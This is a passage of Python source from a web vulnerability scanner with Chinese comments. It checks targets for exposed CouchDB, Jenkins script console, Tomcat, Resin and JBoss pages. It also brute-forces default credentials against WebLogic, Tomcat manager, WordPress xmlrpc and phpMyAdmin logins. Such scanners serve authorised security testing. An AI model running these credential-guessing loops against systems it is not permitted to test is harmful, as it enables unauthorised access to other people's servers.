        r1_1_9 = url + '/x.php'
        r1 = url + '/1.php'
        r2 = url+'/tz/tz.php'
        r4 = url + '/env.php'
        r6 = url + '/tz.php'
        r7 = url + '/p1.php'
        r8 = url + '/p.php'
        r1_0 = url+'/admin_aspcheck.asp'
        r2_0 = url+'/tz/tz.asp'
        r4_0 = url + '/env.asp'
        r6_0 = url + '/tz.asp'
        r7_0 = url + '/p1.asp'
        r8_0 = url + '/p.asp'
        r4_0_0 = url +'/aspcheck.asp'
        r_.append(r1)
        r_.append(r2)
        r_.append(r4)
        r_.append(r6)
        r_.append(r7)
        r_.append(r8)
        r_.append(r1_0)
        r_.append(r2_0)
        r_.append(r4_0)
        r_.append(r6_0)
        r_.append(r7_0)
        r_.append(r8_0)
        r_.append(r4_0_0)
        r_.append(r1_1_1)
        r_.append(r1_1_2)
        r_.append(r1_1_3)
        r_.append(r1_1_4)
        r_.append(r1_1_5)
        r_.append(r1_1_6)
        r_.append(r1_1_7)
        r_.append(r1_1_8)
        r_.append(r1_1_9)
        for r_r in r_:
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent':UA}
                rxr = requests.get(url=r_r,headers=headers,timeout=10)
                if 'upload_max_filesize' in rxr.content or 'SoftArtisans.FileManager' in rxr.content:
                    res = '服务器探针信息泄露:' + r_r
                    vlun_list.append(res)
                else:
                    pass
            except:
                pass
    except:
        pass
    
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        rr = requests.get(url=str(url + '/_config'),headers=headers, timeout=5)
        if "couch" in rr.content:
            res = 'CouchDB未授权访问漏洞:' + rr.url.strip('/')
            vlun_list.append(res)
    except:
        pass
    
    try:
        r_=[]
        r1= url +'/script'
        r3 =  url + ':8080/script'
        r_.append(r1)
        r_.append(r3)
        for r_r in r_:
            try:
                UA = random.choice(headerss)
                headers = {'User-Agent': UA}
                rxr = requests.get(url=r_r,headers=headers,timeout=8)
                if 'arbitrary' in rxr.content:
                    res = 'Jenkins未授权访问漏洞:' + rxr.url.strip('/')
                    vlun_list.append(res)
            except:
                pass
    except:
        pass
    
    try:
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        rrr = requests.get(url=str(url+'/servlets-examples/'),headers=headers,timeout=5)
        if 'servlet/RequestParamExample' in rrr.content:
            res = 'Tomcat example 应用信息泄漏漏洞:' + rrr.url.strip('/')
            vlun_list.append(res)
    except:
        pass

    try:
        r_=[]
        r1= url +'/resin-doc/admin/index.xtp'
        r3 =  url + ':8080/resin-doc/admin/index.xtp'
        r5 = url + ':8443/resin-doc/admin/index.xtp'
        r_.append(r1)
        r_.append(r3)
        r_.append(r5)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,headers=headers,timeout=8)
                if '/resin-doc/examples/index.xtp' in rxr.content:
                    res = 'Resin viewfile远程文件读取漏洞:' + r_r
                    vlun_list.append(res)
            except:
                pass
    except:
        pass

    try:
        r_=[]
        r1= url +'/jmx-console/'
        r3 = url + ':8080/jmx-console/'
        r_.append(r1)
        r_.append(r3)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,headers=headers,timeout=8)
                if 'flavor=URL,type=DeploymentScanner' in rxr.content:
                    res = 'JBoss后台上传漏洞:' + r_r
                    vlun_list.append(res)
            except:
                pass
    except:
        pass

    try:
        r_=[]
        r1=url +'/console/login/LoginForm.jsp'
        r3 = url + ':7001/console/login/LoginForm.jsp'
        r7 = url + ':7002/console/login/LoginForm.jsp'
        r_.append(r1)
        r_.append(r3)
        r_.append(r7)
        for r_r in r_:
            try:
                for uuser in user_list:
                    for ppass in password_list:
                        data = {'j_username': str(uuser), 'j_password': str(ppass), 'j_character_encoding': 'GBK'}
                        rxr = requests.post(url=r_r,data=data,headers=headers,timeout=8)
                        if 'WebLogic Server Console' in rxr.content:
                            res = 'Weblogic弱口令漏洞:' + r_r + ':' + uuser + '|' + ppass
                            vlun_list.append(res)
            except:
                pass
    except:
        pass


    try:
        r_=[]
        r1 = url+'/RetainServer/Manager/login.jsp'
        r2 = url+'/Manager/login.jsp'
        r_.append(r1)
        r_.append(r2)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,headers=headers,timeout=10)
                if 'onkeypress="if(event.keyCode==13)' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data={'login':str(uuser),'pass':str(ppass),'Language':'myLang'}
                            try:
                                r_br=requests.post(url=r_r,data=data,timeout=10)
                                if 'Router Configuration' in r_br.content:
                                    res = 'Tomcat远程部署弱口令:' + r_r + ':' + uuser + '|' + ppass
                                    vlun_list.append(res)
                            except:
                                pass
            except:
                pass
    except:
        pass

    try:
        r_=[]
        r1=url+':8080/manager/html'
        r3=url+':8081/manager/html'
        r_.append(r1)
        r_.append(r3)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,headers=headers,timeout=5)
                if 'Manager App HOW-TO' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            headers = {'Authorization': 'Basic %s==' % (base64.b64encode(uuser + ':' + ppass))}
                            try:
                                rxrx=requests.get(url=r_r,headers=headers,timeout=8)
                                if rxrx.status_code==200:
                                    res = 'Tomcat后台管理弱口令:' + r_r + ':' + uuser + '|' + ppass
                                    vlun_list.append(res)
                            except:
                                pass
            except:
                pass
    except:
        pass

    try:
        flag_list = ['<name>isAdmin</name>', '<name>url</name>']
        for uuser in user_list:
            for ppass in password_list:
                try:
                    login_path = '/xmlrpc.php'
                    PostStr = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall>  <methodName>wp.getUsersBlogs</methodName>  <params>   <param><value>%s</value></param>   <param><value>%s</value></param>  </params></methodCall>" % (uuser, ppass)
                    request = urllib2.Request(url + login_path, PostStr)
                    resa = urllib2.urlopen(request, timeout=5)
                    res_html = resa.read()
                    for flag in flag_list:
                        if flag in res_html:
                            res = 'Wordpress弱口令:' + url+login_path + ':' + uuser + '|' + ppass
                            vlun_list.append(res)
                except :
                    pass
    except:
        pass

    # Phpmyadmin弱口令漏洞
    try:
        r_=[]
        r1 = url+'/phpmyadmin/index.php'
        r2 = url+':999/phpmyadmin/index.php'
        r4 = url + ':8080/phpmyadmin/index.php'
        r_.append(r1)
        r_.append(r2)
        r_.append(r4)
        for r_r in r_:
            try:
                rxr = requests.get(url=r_r,timeout=10)
                if 'Documentation.html' in rxr.content:
                    for uuser in user_list:
                        for ppass in password_list:
                            data={'pma_username':str(uuser),'pma_password':str(ppass)}
                            try:
                                r_br=requests.post(url=r_r,data=data,timeout=10)
                                if 'mainFrameset' in r_br.content:
                                    res = 'PHPmyadmin弱口令:' + r_r + ':' + uuser + '|' + ppass
                                    vlun_list.append(res)
                            except:
                                pass
                else:
                    pass
            except:
                pass
    except:
        pass
    if vlun_list == []:
        return None
    else:
        return vlun_list

if __name__ == '__main__':
    get_ip_vlun('127.0.0.1')
    get_url_vlun('http://127.0.0.1')